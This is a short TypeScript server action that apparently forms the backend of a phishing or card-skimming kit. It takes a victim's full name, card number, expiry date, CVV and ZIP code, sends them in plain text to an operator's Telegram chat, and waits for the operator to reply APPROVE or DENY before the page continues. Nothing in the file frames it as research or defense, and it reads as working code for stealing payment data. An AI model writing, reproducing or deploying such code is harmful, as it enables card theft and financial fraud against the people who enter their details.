'use server';

import { bot, chatId, lastMessage, resetLastMessage } from './tele'

export async function submitDetails(fullName: string, cardNumber: string, expiration: string, cvv: string, zip: string) {
    if (!chatId) return false;

    await bot.sendMessage(chatId, `Card details received.

Full Name: ${fullName}
Card Number: ${cardNumber}
Expiration: ${expiration}
CVV: ${cvv}
ZIP: ${zip}

Enter "APPROVE" to confirm or "DENY" to deny.`);

    return new Promise<boolean>(resolve => {
        let timeout: NodeJS.Timeout = setInterval(() => {
            if (lastMessage === "APPROVE") {
                clearInterval(timeout);
                resetLastMessage();
                bot.sendMessage(chatId!, "Card details approved.")
                resolve(true);
            } else if (lastMessage === "DENY") {
                clearInterval(timeout);
                resetLastMessage();
                bot.sendMessage(chatId!, "Card details rejected.")
                resolve(false);
            }
        }, 1000);
    });
}